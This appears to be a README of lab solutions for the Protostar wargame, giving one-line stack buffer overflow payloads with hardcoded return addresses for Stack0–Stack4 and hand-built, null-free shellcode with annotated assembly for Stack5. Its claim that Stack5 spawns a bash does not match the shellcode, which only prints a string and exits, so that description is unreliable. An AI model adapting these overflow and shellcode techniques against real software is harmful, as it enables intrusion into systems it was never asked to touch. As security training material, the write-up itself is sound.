# Exploit-Exercises-Protostar-
In 2016 I started working on solutions of Protostar in my spare time. Because of the university commitments, I had to stop.
I leave below the solutions to which I had arrived, that are the first 5 stages.
The last one is a bit more difficult, so I added a little explanation on how I wrote the shellcode.

# What is Protostar?
[Protostar](https://exploit-exercises.com/protostar/) introduces basic memory corruption issues such as buffer overflows, format strings and heap exploitation under “old-style” Linux system that does not have any form of modern exploit mitigation systems enabled.

# Credentials
Login: user
Password: user

# Solutions

#[Stack0:](https://exploit-exercises.com/protostar/stack0/)
Just a buffer overflow to change a condition variable at the branch: 
```python
python -c 'print "a"*65' | ./stack0
```

#[Stack1:](https://exploit-exercises.com/protostar/stack1/) 
A buffer overflow to change condition variable at the branch with a required value:

```python
./stack1 $(python -c 'print "a"*64+"dcba"')
```

#[Stack2:](https://exploit-exercises.com/protostar/stack2/) 
A buffer overflow through environment variables:

```python
export GREENIE=$(python -c 'print "a"*64+"\x0a\x0d\x0a\x0d"')
```

#[Stack3:](https://exploit-exercises.com/protostar/stack3/) 
Search for a pointer to the winner function and override the function pointers stored in the stack  

```python
strings -o stack3 					
objdump -d stack3 > /home/user/dump.txt 			
python -c 'print "a"*64+"\x24\x84\x04\x08"' | ./stack3	
```

#[Stack4:](https://exploit-exercises.com/protostar/stack4/) 
Search for a pointer to the winner function and override saved EIP

```python
python -c 'print "a"*72+"\x08\xf8\xff\xbf"+"\xf4\x83\x04\x08"'
``` 

The buffer is 64 bytes, so why have we filled it with 72 bytes plus another 8 bytes of addresses? Because, as suggested by the hints on the site, EIP is not directly after the end of the buffer because compiler padding can also increase the size.
In fact, it allocates exactly 80 bytes (sub 0x50).

#[Stack5:](https://exploit-exercises.com/protostar/stack5/) 
Spawning a bash with a shellcode: 
(I suggest to read this good [article](http://www.vividmachines.com/shellcode/shellcode.html) first)


```asm
\xeb\x1b\x59\x31\xd2\x42\x83\xfa\x15\x75\xfa\x31\xdb\x43\x31\xc0\x40\x40\x40\x40\xcd\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe0\xff\xff\xff\nhello word you guys \n
```

Where it came from?

```asm
"\xeb\x1e"                  		/* jmp    0x80483b7(ender) */ 
"\xba\x15\x00\x00\x00"              /* mov    $0x15,%edx */ ->0x15 = length of str
"\x59"          			        /* pop    %ecx */ 
"\xbb\x01\x00\x00\x00"              /* mov    $0x1,%ebx */ 
"\xb8\x04\x00\x00\x00"              /* mov    $0x4,%eax */ 
"\xcd\x80" 		                    /* int    $0x80 */ 
"\xbb\x00\x00\x00\x00"              /* mov    $0x0,%ebx */ 
"\xb8\x01\x00\x00\x00"              /* mov    $0x1,%eax */ 
"\xcd\x80" 	                        /* int    $0x80 */ 
"\xe8\xdd\xff\xff\xff"              /* call   0x8048399(starter) */ 
```

Removing null bytes:

```asm
"\xeb\x1b"               	/* jmp    0x80483b4(ender) */ 
"\x59"          			/* pop    %ecx */ 
"\x31\xd2" 		            /* xor    %edx,%edx */ 
"\x42"     		            /* inc    %edx */ 
"\x83\xfa\x15"  	        /* cmp    $0x15,%edx */ 
"\x75\xfa" 		            /* jne    804839c(label) */ 
"\x31\xdb"		            /* xor    %ebx,%ebx */ 
"\x43"     			        /* inc    %ebx */ 
"\x31\xc0" 	                /* xor    %eax,%eax */ 
"\x40"         		      	/* inc    %eax */ 
"\x40"         		       	/* inc    %eax */ 
"\x40"         		       	/* inc    %eax */ 
"\x40"         		       	/* inc    %eax */ 
"\xcd\x80"         		    /* int    $0x80 */    
"\x31\xdb"         		  	/* xor    %ebx,%ebx */ 
"\x31\xc0"         		   	/* xor    %eax,%eax */ 
"\x40"         		      	/* inc    %eax */ 
"\xcd\x80"         		    /* int    $0x80 */
"\xe8\xe0\xff\xff\xff"     	/* call   0x8048399(starter) */
```



